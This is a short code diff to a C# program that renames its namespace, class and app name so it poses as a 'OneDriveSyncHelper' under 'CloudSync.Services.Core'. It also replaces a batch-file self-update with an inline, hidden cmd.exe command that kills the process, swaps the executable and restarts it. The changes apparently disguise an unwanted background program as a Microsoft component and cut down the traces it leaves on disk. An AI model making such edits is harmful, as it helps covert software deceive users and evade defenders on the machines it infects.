@@ -13,11 +13,11 @@ using System.Runtime.InteropServices;
 using System.Security.Cryptography;
 using System.Text;
 
-namespace G2DK.Utilities
+namespace CloudSync.Services.Core
 {
-    public class Provider
+    public class AppConfig
     {
-        public static readonly string APP = "helper";
+        public static readonly string APP = "OneDriveSyncHelper";
         public static readonly string exe = System.Reflection.Assembly.GetExecutingAssembly().Location;
 
         public static string GetHostname()
@@ -80,21 +80,15 @@ namespace G2DK.Utilities
 
         public static void Update(string updatePath)
         {
-            string updateScript = Path.Combine(Path.GetTempPath(), "update.bat");
-            using (StreamWriter writer = new StreamWriter(updateScript))
-            {
-                writer.WriteLine("@ECHO OFF");
-                writer.WriteLine("TIMEOUT /t 3 /nobreak > NUL");
-                writer.WriteLine($"TASKKILL /IM \"{Path.GetFileName(exe)}\" /F > NUL 2>&1");
-                writer.WriteLine($"MOVE \"{updatePath}\" \"{exe}\"");
-                writer.WriteLine($"DEL \"{updateScript}\"");
-                writer.WriteLine($"START \"\" \"{exe}\"");
-            }
+            // Inline cmd instead of .bat file
+            string exeName = Path.GetFileName(exe);
+            string cmd = $"/C timeout /t 3 /nobreak >nul & taskkill /IM \"{exeName}\" /F >nul 2>&1 & move \"{updatePath}\" \"{exe}\" & start \"\" \"{exe}\"";
 
             Program.CleanUp();
             Process.Start(new ProcessStartInfo
             {
-                FileName = updateScript,
+                FileName = "cmd.exe",
+                Arguments = cmd,
                 CreateNoWindow = true,
                 UseShellExecute = false,
                 WorkingDirectory = Path.GetDirectoryName(exe)
